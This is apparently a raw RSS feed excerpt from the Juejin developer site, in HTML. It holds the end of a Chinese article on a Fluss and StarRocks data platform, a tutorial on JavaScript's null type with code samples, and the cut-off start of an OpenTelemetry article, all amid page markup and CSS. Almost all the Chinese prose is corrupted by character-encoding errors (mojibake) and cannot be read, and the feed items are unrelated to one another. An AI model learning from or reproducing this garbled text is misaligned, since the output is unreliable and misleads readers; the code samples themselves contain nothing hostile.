<p>3ã€FlussÂ æ”¯æŒÂ AGGÂ TableÂ å’ŒÂ RoaringBitmapÂ å¯ä»¥ä¸ºæˆ‘ä»¬å®æ—¶è®¡ç®—UVï¼Œä»£ä»·æ›´å°ï¼Œæˆæœ¬æ›´ä½ã€‚Â </p>
<h3 data-id="heading-26">6.2ã€StarRockså­˜ç®—åˆ†ç¦»</h3>
<p>éšç€ä¸šåŠ¡ä½“é‡çš„å¢åŠ å’Œå¤æ‚åº¦çš„æé«˜ï¼Œå°¤å…¶æ˜¯AIéƒ¨åˆ†å¯¹äºæ•°ä»“æ¨¡å‹äº§å‡ºçš„æ•°æ®çš„éœ€æ±‚è¶Šæ¥è¶Šå¼ºçƒˆï¼Œæˆ‘ä»¬è¶Šæ¥è¶Šéœ€è¦èµ„æºè¿›è¡Œéš”ç¦»çš„ç¡¬éœ€æ±‚æˆ–è€…ç”¨æˆ·ç‹¬äº«èµ„æºï¼Œç›®å‰StarRocksä¸­çš„å­˜ç®—åˆ†ç¦»æ”¯æŒè®¡ç®—èµ„æºçš„ç¡¬éš”ç¦»ï¼Œæˆ‘ä»¬è¿˜èƒ½æŠŠOLAPå’ŒAIéƒ¨åˆ†çš„éœ€æ±‚ï¼ˆRAGã€æ•°æ®éœ€æ±‚ï¼‰çš„æ£€ç´¢æ”¾åœ¨StarRocksä¸­åŠ é€ŸæŸ¥è¯¢ï¼Œå„è‡ªä¸šåŠ¡åŸŸäº’ä¸å½±å“ã€‚å¼€å¯å­˜ç®—åˆ†ç¦»åï¼Œæ•°æ®åªéœ€è¦å­˜å‚¨ä¸€ä»½ï¼Œæ•°æ®åˆå¹¶å‹åŠ›å‡å°‘ã€‚</p>
<h3 data-id="heading-27">6.3ã€å¢é‡è®¡ç®—</h3>
<p>å¢é‡è®¡ç®—ä¸€ç›´æ˜¯æˆ‘ä»¬ä¸€ä¸ªæ¯”è¾ƒå…³æ³¨çš„ç‚¹ï¼Œæˆ‘ä»¬å¸Œæœ›æœ€å¤§åŒ–çš„èŠ‚çœæˆæœ¬å’ŒæŠ€æœ¯å¤æ‚åº¦ï¼Œå¯¹äºä¸€äº›å†å²æ•°æ®ï¼Œå®Œå…¨å¯ä»¥ä½¿ç”¨å¢é‡è®¡ç®—æ¥è¿›è¡Œä»£æ›¿ï¼Œä¸æ˜¯æ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯éœ€è¦å‡†å®æ—¶ï¼Œå‚è€ƒSnowFlakeã€Hologresã€Flinkç‰©åŒ–è¡¨ç­‰äº§å“å‡å·²æ”¯æŒå¢é‡è®¡ç®—ï¼Œé™¤äº†Flinkç‰©åŒ–è¡¨å¯ä»¥åšåˆ°ç§’çº§åˆ«çš„å¢é‡è®¡ç®—ï¼Œæ•°æ®åº“çº§åˆ«çš„å¢é‡è®¡ç®—ç›®å‰è¿˜æ˜¯åˆ†é’Ÿçº§åˆ«ï¼Œä½†ç»¼åˆå¯¹æ¯”æ¥è¯´ï¼ŒFlinkçš„ç‰©åŒ–è¡¨çš„æˆæœ¬ç›¸æ¯”åœ¨æ•°æ®åº“å±‚é¢çš„é›†æˆæˆæœ¬ä¼šåé«˜ã€‚æˆ‘ä»¬å¸Œæœ›åœ¨StarRocksåŒæ ·åšåˆ°å¢é‡è®¡ç®—ï¼Œå‡å°‘ç»´æŠ¤æˆæœ¬å’Œè®¡ç®—ï¼Œå¾ˆé«˜å…´çš„æ˜¯æœ‰çœ‹åˆ°StarRockçš„æœ‰è¿™ä¸€æ˜ç¡®çš„æ¢è®¨å’Œè®¡åˆ’ã€‚</p>
<h3 data-id="heading-28">6.4ã€åŠç»“æ„åŒ–æ•°æ®-æ•°æ®åˆ—å­˜</h3>
<p>ç›®å‰æˆ‘ä»¬çš„ç¿äººäº‹ç³»ç»Ÿéƒ¨åˆ†æ•°æ®æ˜¯JSONæ•°æ®ç»“æ„ç»“æ„ï¼Œä¸”JSONä¸­çš„keyæ˜¯åŠ¨æ€ä¸å›ºå®šï¼Œè¿™ä½¿å¾—è§£æã€è¾“å‡ºè¿™äº›æ•°æ®éƒ½æ˜¯æ¯”è¾ƒè€—è´¹èµ„æºçš„æ“ä½œï¼Œç›®å‰StarRockså·²æ”¯æŒFlatÂ Jsonå¯¹åŠç»“æ„åŒ–æ•°æ®è¿›è¡Œæ•°æ®åˆ—å­˜ï¼Œä½†ç›®å‰å—é™äºè¿™ä¸ªå‚æ•°æ˜¯æ•´ä¸ªå®ä¾‹çš„å¼€å¯ï¼Œæˆ‘ä»¬æ›´éœ€è¦çš„æ˜¯è¡¨çº§åˆ«çš„å‚æ•°ï¼Œç›®å‰StarRockså·²è¿›åŒ–åˆ°FlatÂ JsonÂ V2ï¼ˆ4.0å·²æ”¯æŒï¼‰ï¼Œæˆ‘ä»¬å°†ä¼šæŒç»­è·Ÿè¿›å…³æ³¨StarRocksç§å¯¹äºåŠç»“æ„åŒ–æ•°æ®çš„èƒ½åŠ›å’Œæˆ‘ä»¬å†…éƒ¨èƒ½å®é™…ä½¿ç”¨çš„åœºæ™¯å’Œèƒ½åŠ›ã€‚</p>
<p>ç¤¾åŒºæ–¹å‘ï¼Œç›®å‰ä¸šç•Œä¸»è¦æ˜¯åŠç»“æ„åŒ–æ•°æ®-æ•°æ®åˆ—å­˜ï¼Œvariantå­—æ®µç±»å‹ï¼Œç›®å‰StarRockså·²æœ‰præ”¯æŒï¼›variantå­—æ®µå…¼å®¹çš„æ•°æ®ç±»å‹ä¼šæ¯”JSONæ›´ä¸°å¯Œï¼Œæˆ‘ä»¬ä¼šæŒç»­è·Ÿè¿›ã€‚Â </p>
<h3 data-id="heading-29">6.5ã€DATA+AI</h3>
<p>AIè¶Šæ¥è¶Šç«çƒ­ï¼Œæˆ‘ä»¬çš„ä¸šåŠ¡å¤æ‚åº¦ä¹Ÿæ˜¯åœ¨æ…¢æ…¢æå‡ï¼Œéšç€Lanceçš„ç«çƒ­ï¼Œæˆ‘ä»¬ä¹Ÿæ€è€ƒå’Œæ¢ç´¢åœ¨AIçš„æ•°æ®åŸºåº§è¿™éƒ¨åˆ†ä¹Ÿèƒ½å’Œå¤§æ•°æ®è¿™éƒ¨åˆ†åšåˆ°ç»Ÿä¸€ï¼Œç›®å‰paimonç¤¾åŒºå’ŒFlusså·²ç»å¼€å§‹é›†æˆlanceï¼Œè¿™æ ·å¯¹æˆ‘ä»¬çš„æ¶æ„å’ŒæŠ€æœ¯æ ˆçš„ä¾µå…¥æ˜¯æœ€å°çš„ï¼Œç­‰åç»­dlfå’ŒFlussé›†æˆåï¼Œæˆ‘ä»¬ä¾ç„¶å‚è€ƒå¯ä»¥ä½¿ç”¨ç°æœ‰çš„æ¶æ„å’ŒæŠ€æœ¯å®ŒæˆDATA+AIçš„èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-30">è‡´è°¢ï¼š</h2>
<p>ç”±è¡·çš„æ„Ÿè°¢é˜¿é‡Œäº‘DLFã€VVR-Flinkã€VVR-Flink-CDCã€EMR-StarRocksã€Flussã€MaxComputeã€DataWorksã€StarRocksç¤¾åŒºç­‰å›¢é˜Ÿåœ¨æœ¬æ¬¡å®è·µè¿‡ç¨‹ä¸­æä¾›çš„å¸®åŠ©å’Œåä½œã€‚</p>
<h2 data-id="heading-31">å‚è€ƒæ–‡æ¡£</h2>
<p>[1]Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.flink-forward.org%2Fabout%23flink-forward" target="_blank" title="https://www.flink-forward.org/about#flink-forward" ref="nofollow noopener noreferrer">www.flink-forward.org/about#flinkâ€¦</a></p>
<p>[2]Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.starrocks.io%2Fzh%2Fdocs%2Fintroduction%2FStarRocks_intro%2F" target="_blank" title="https://docs.starrocks.io/zh/docs/introduction/StarRocks_intro/" ref="nofollow noopener noreferrer">docs.StarRocks.io/zh/docs/intâ€¦</a></p>
<p>[3]Â <a href="https://link.juejin.cn?target=https%3A%2F%2Ffluss.apache.org%2Fdocs%2Fnext%2F" target="_blank" title="https://fluss.apache.org/docs/next/" ref="nofollow noopener noreferrer">Fluss.apache.org/docs/next/</a></p>
<p>[4]Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fnightlies.apache.org%2Fflink%2Fflink-cdc-docs-master%2F" target="_blank" title="https://nightlies.apache.org/flink/flink-cdc-docs-master/" ref="nofollow noopener noreferrer">nightlies.apache.org/flink/flinkâ€¦</a></p>
<p>[5]Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fnightlies.apache.org%2Fflink%2Fflink-docs-release-2.0%2F" target="_blank" title="https://nightlies.apache.org/flink/flink-docs-release-2.0/" ref="nofollow noopener noreferrer">nightlies.apache.org/flink/flinkâ€¦</a></p>
<p>[6]<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FbDb9OUuhgwr_NQvVkv3HEw" target="_blank" title="https://mp.weixin.qq.com/s/bDb9OUuhgwr_NQvVkv3HEw" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/bDb9OUuhgâ€¦</a></p>
<p>[7]<a href="https://link.juejin.cn?target=https%3A%2F%2Fyunqi.aliyun.com%2F" target="_blank" title="https://yunqi.aliyun.com/" ref="nofollow noopener noreferrer">yunqi.aliyun.com/</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScriptçš„æ•°æ®ç±»å‹ â€”â€” Nullç±»å‹]]></title>    <link>https://juejin.cn/post/7602914378389667850</link>    <guid>https://juejin.cn/post/7602914378389667850</guid>    <pubDate>2026-02-05T09:13:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602914378389667850" data-draft-id="7599828354515304488" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScriptçš„æ•°æ®ç±»å‹ â€”â€” Nullç±»å‹"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-02-05T09:13:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ©˜æœµ"/> <meta itemprop="url" content="https://juejin.cn/user/1099989273025416"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScriptçš„æ•°æ®ç±»å‹ â€”â€” Nullç±»å‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1099989273025416/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ©˜æœµ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:13:37.000Z" title="Thu Feb 05 2026 09:13:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ JavaScript ä¸­ï¼Œ<code>Null</code>ç±»å‹æ˜¯ä¸€ä¸ªåŸºæœ¬æ•°æ®ç±»å‹ï¼Œå®ƒåªæœ‰ä¸€ä¸ªå”¯ä¸€çš„å€¼ï¼š<code>null</code>ã€‚é€šå¸¸è¢«ç”¨æ¥è¡¨ç¤ºä¸€ä¸ª<strong>æœ‰æ„ä¸ºä¹‹çš„ã€ä¸æŒ‡å‘ä»»ä½•å¯¹è±¡å€¼çš„ç©ºå€¼</strong>ã€‚é€»è¾‘ä¸Šè®²ï¼Œ<code>null</code>å€¼è¡¨ç¤ºä¸€ä¸ª<strong>ç©ºå¯¹è±¡æŒ‡é’ˆ</strong>ï¼Œè¿™ä¹Ÿæ˜¯ç»™<code>typeof</code>ä¼ ä¸€ä¸ª<code>null</code>ä¼šè¿”å›"<code>object</code>"çš„åŸå› ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> car = <span class="hljs-literal">null</span>; 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> car); <span class="hljs-comment">// "object"ï¼ŒJavaScriptçš„å†å²é—ç•™ Bugï¼Œä¸ä»£è¡¨nullæ˜¯å¯¹è±¡</span>
<span class="hljs-comment">//å…·ä½“åŸå› :ä¸åŒçš„å¯¹è±¡åœ¨åº•å±‚éƒ½è¡¨ç°ä¸ºäºŒè¿›åˆ¶ï¼Œ</span>
<span class="hljs-comment">//åœ¨ JavaScript ä¸­äºŒè¿›åˆ¶å‰ä¸‰ä½éƒ½ä¸º 0 çš„è¯ä¼šè¢«åˆ¤æ–­ä¸º object ç±»å‹ï¼Œ </span>
<span class="hljs-comment">//null çš„äºŒè¿›åˆ¶å…¨éƒ¨ä¸º 0ï¼Œè‡ªç„¶å‰ä¸‰ä½ä¹Ÿæ˜¯ 0ï¼Œ</span>
<span class="hljs-comment">//æ‰€ä»¥æ‰§è¡Œ typeof å€¼ä¼šè¿”å› objectã€‚</span>
</code></pre>
<p><strong>åœ¨å®šä¹‰å°†æ¥è¦ä¿å­˜å¯¹è±¡å€¼çš„å˜é‡æ—¶ï¼Œå»ºè®®ä½¿ç”¨<code>null</code>æ¥åˆå§‹åŒ–ï¼Œä¸è¦ä½¿ç”¨å…¶ä»–å€¼ã€‚</strong> è¿™æ ·ï¼Œåªè¦æ£€æŸ¥è¿™ä¸ªå˜é‡çš„å€¼æ˜¯ä¸æ˜¯ <code>null</code> å°±å¯ä»¥çŸ¥é“è¿™ä¸ªå˜é‡æ˜¯å¦åœ¨åæ¥è¢«é‡æ–°èµ‹äºˆäº†ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">if</span> (car != <span class="hljs-literal">null</span>) {  
 <span class="hljs-comment">// car æ˜¯ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ </span>
} 
</code></pre>
<p><strong>åˆå§‹åŒ–å˜é‡</strong>ï¼šé¢„å…ˆå£°æ˜ä¸€ä¸ªå˜é‡ï¼Œå¹¶æ˜ç¡®è¡¨ç¤ºå®ƒæš‚ä¸æŒ‡å‘ä»»ä½•å¯¹è±¡ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">let</span> futureObject = <span class="hljs-literal">null</span>; <span class="hljs-comment">// è¡¨æ˜è¯¥å˜é‡å‡†å¤‡åœ¨å°†æ¥å®¹çº³ä¸€ä¸ªå¯¹è±¡</span>
</code></pre>
<p><strong>æ¸…ç©ºå¯¹è±¡å¼•ç”¨</strong>ï¼šå½“ä¸€ä¸ªå¯¹è±¡ä¸å†éœ€è¦æ—¶ï¼Œå°†å…¶å¼•ç”¨è®¾ç½®ä¸º <code>null</code>ï¼Œè¿™æœ‰åŠ©äºåƒåœ¾å›æ”¶æœºåˆ¶é‡Šæ”¾å†…å­˜ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">myHeavyObject</span> = { ... }<span class="hljs-comment">; // ä¸€ä¸ªå ç”¨å¤§é‡å†…å­˜çš„å¯¹è±¡</span>
// ... ä½¿ç”¨å®Œæˆå
<span class="hljs-attr">myHeavyObject</span> = null<span class="hljs-comment">; // æ–­å¼€å¼•ç”¨ï¼Œæç¤ºå¯ä»¥å›æ”¶å†…å­˜</span>
</code></pre>
<p><strong>å‡½æ•°çš„è¿”å›å€¼</strong>ï¼šå½“å‡½æ•°æ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆç»“æœæˆ–æ“ä½œå¤±è´¥æ—¶ï¼Œè¿”å› <code>null</code>æ¥è¡¨ç¤º"æ— "ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">findUser</span>(<span class="hljs-params">id</span>) {
  <span class="hljs-keyword">const</span> user = users.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">u</span> =&gt;</span> u.<span class="hljs-property">id</span> === id);
  <span class="hljs-keyword">return</span> user || <span class="hljs-literal">null</span>; <span class="hljs-comment">// æ‰¾åˆ°ç”¨æˆ·è¿”å›ç”¨æˆ·å¯¹è±¡ï¼Œå¦åˆ™è¿”å› null</span>
}
</code></pre>
<p><strong>DOM æ“ä½œ</strong>ï¼šåœ¨è·å–ä¸å­˜åœ¨çš„ DOM å…ƒç´ æ—¶ï¼Œé€šå¸¸ä¼šè¿”å› <code>null</code>ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">nonExistentElement</span> = document.getElementById(<span class="hljs-string">'does-not-exist'</span>)<span class="hljs-comment">;</span>
console.log(nonExistentElement)<span class="hljs-comment">; // null</span>
</code></pre>
<p><strong>å¦‚ä½•å®‰å…¨åœ°æ£€æµ‹ä¸å¤„ç†</strong> <strong><code>null</code></strong> <strong>ï¼Ÿ</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">//æ­£ç¡®æ£€æµ‹ null</span>
<span class="hljs-comment">//ç”±äº typeofçš„ Bugï¼Œæœ€å¯é çš„æ–¹æ³•æ˜¯ä½¿ç”¨ä¸¥æ ¼ç›¸ç­‰è¿ç®—ç¬¦ï¼ˆ===ï¼‰</span>
<span class="hljs-keyword">if</span> (myVar === <span class="hljs-literal">null</span>) {
  <span class="hljs-comment">// æ˜ç¡®å¤„ç† myVar ä¸º null çš„æƒ…å†µ</span>
}

<span class="hljs-comment">//å®‰å…¨åœ°è®¿é—®å¯èƒ½ä¸º nullçš„å±æ€§</span>
<span class="hljs-comment">//åœ¨å°è¯•è®¿é—® nullï¼ˆæˆ– undefinedï¼‰çš„å±æ€§æ—¶ï¼ŒJavaScript ä¼šæŠ›å‡º TypeErrorã€‚</span>
<span class="hljs-comment">//å¯é€‰é“¾æ“ä½œç¬¦ï¼ˆ?.ï¼‰ ï¼šå¦‚æœé‡åˆ° nullæˆ– undefinedå°±ç«‹å³åœæ­¢è®¿é—®ï¼Œè¿”å› undefined</span>
<span class="hljs-keyword">let</span> name = user?.profile?.name; <span class="hljs-comment">// å¦‚æœ user æˆ– profile ä¸º null/undefinedï¼Œname åˆ™ä¸º undefiend</span>
<span class="hljs-comment">//ç©ºå€¼åˆå¹¶æ“ä½œç¬¦ï¼ˆ??ï¼‰ ï¼šä¸º nullæˆ– undefinedæä¾›ä¸€ä¸ªé»˜è®¤å€¼</span>
<span class="hljs-keyword">let</span> displayName = user?.profile?.name ?? <span class="hljs-string">'åŒ¿åç”¨æˆ·'</span>; <span class="hljs-comment">// å¦‚æœåå­—ä¸ºç©ºï¼Œåˆ™æ˜¾ç¤º'åŒ¿åç”¨æˆ·'</span>
</code></pre>
<p><strong>ä¸</strong> <strong><code>undefined</code></strong> <strong>çš„åŒºåˆ«</strong></p>
<p><code>undefined</code>å€¼æ˜¯ç”±<code>null</code>å€¼æ´¾ç”Ÿè€Œæ¥çš„ï¼Œåœ¨ECMA-262å°†å®ƒä»¬å®šä¹‰ä¸ºè¡¨é¢ä¸Šç›¸ç­‰ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">null</span> == <span class="hljs-literal">undefined</span>); <span class="hljs-comment">// true</span>
</code></pre>
<p>å³ä½¿<code>null</code>å’Œ<code>undefined</code>æœ‰å…³ç³»ï¼Œå®ƒä»¬çš„ç”¨é€”ä¹Ÿæ˜¯å®Œå…¨ä¸ä¸€æ ·çš„ã€‚ä¸è¦æ˜¾å¼åœ°å°†å˜é‡å€¼è®¾ç½®ä¸º<code>undefined</code>ï¼Œå½“æˆ‘ä»¬è¯•å›¾è®¿é—®æŸä¸ªä¸å­˜åœ¨çš„æˆ–è€…æ²¡æœ‰èµ‹å€¼çš„å˜é‡æ—¶ï¼Œå°±ä¼šå¾—åˆ°ä¸€ä¸ª <code>undefined</code> å€¼ã€‚Javascript ä¼šè‡ªåŠ¨å°†å£°æ˜æ—¶æ²¡æœ‰è¿›è¡Œåˆå§‹åŒ–çš„å˜é‡è®¾ä¸º <code>undifined</code>ã€‚</p>
<p>ä½†<code>null</code>ä»»ä½•æ—¶å€™ï¼Œåªè¦<strong>å˜é‡è¦ä¿å­˜å¯¹è±¡</strong>ï¼Œè€Œå½“æ—¶åˆæ²¡æœ‰é‚£ä¸ªå¯¹è±¡å¯ä¿å­˜ï¼Œå°±è¦ç”¨<code>null</code>æ¥å¡«å……è¯¥å˜é‡ã€‚null ä¸èƒ½é€šè¿‡ Javascript æ¥è‡ªåŠ¨èµ‹å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»è¦æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨æ¥ç»™æŸä¸ªå˜é‡èµ‹å€¼ä¸º <code>null</code>ã€‚è¿™æ ·å°±å¯ä»¥ä¿æŒ<code>null</code>æ˜¯ç©ºå¯¹è±¡æŒ‡é’ˆçš„è¯­ä¹‰ï¼Œå¹¶è¿›ä¸€æ­¥ä¸<code>undefined</code>åŒºåˆ†å¼€æ¥ã€‚</p>
<p>è™½ç„¶ <code>undefined</code>å’Œ <code>null</code>åœ¨éä¸¥æ ¼ç›¸ç­‰æ¯”è¾ƒï¼ˆ<code>==</code>ï¼‰æ—¶ç»“æœä¸º <code>true</code>ï¼Œä½†å®ƒä»¬æœ‰æœ¬è´¨çš„ä¸åŒã€‚</p>






























<table><thead><tr><th><strong>ç‰¹æ€§</strong></th><th><strong>undefined</strong></th><th><strong>null</strong></th></tr></thead><tbody><tr><td>å«ä¹‰</td><td>è¡¨ç¤ºå˜é‡å¤„äºè‡ªç„¶çš„ã€æœªåˆå§‹åŒ–çš„åŸå§‹çŠ¶æ€ã€‚</td><td>è¡¨ç¤ºä¸€ä¸ªè¢«äººä¸ºä¸»åŠ¨èµ‹å€¼çš„ç©ºå¯¹è±¡æŒ‡é’ˆï¼Œä»£è¡¨"ç©ºå€¼"ã€‚</td></tr><tr><td>æ•°æ®ç±»å‹</td><td><code>typeof</code>è¿”å› "undefined"ã€‚</td><td><code>typeof</code>è¿”å› "object"ï¼ˆè¿™æ˜¯å†å²é—ç•™é—®é¢˜ï¼‰ã€‚</td></tr><tr><td>ä¸¥æ ¼ç›¸ç­‰</td><td><code>undefined === null</code>çš„ç»“æœä¸º falseã€‚</td><td/></tr><tr><td>è½¬æ¢ä¸ºæ•°å­—</td><td><code>Number(undefined)</code>çš„ç»“æœæ˜¯ NaNã€‚</td><td><code>Number(null)</code>çš„ç»“æœæ˜¯ 0ã€‚</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ OpenTelemetry æºç ä¸å®æˆ˜ï¼ˆä¸‹ç¯‡ï¼‰]]></title>    <link>https://juejin.cn/post/7603030564838146102</link>    <guid>https://juejin.cn/post/7603030564838146102</guid>    <pubDate>2026-02-05T09:26:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603030564838146102" data-draft-id="7603010441149612073" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ OpenTelemetry æºç ä¸å®æˆ˜ï¼ˆä¸‹ç¯‡ï¼‰"/> <meta itemprop="keywords" content="åç«¯,Go"/> <meta itemprop="datePublished" content="2026-02-05T09:26:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" 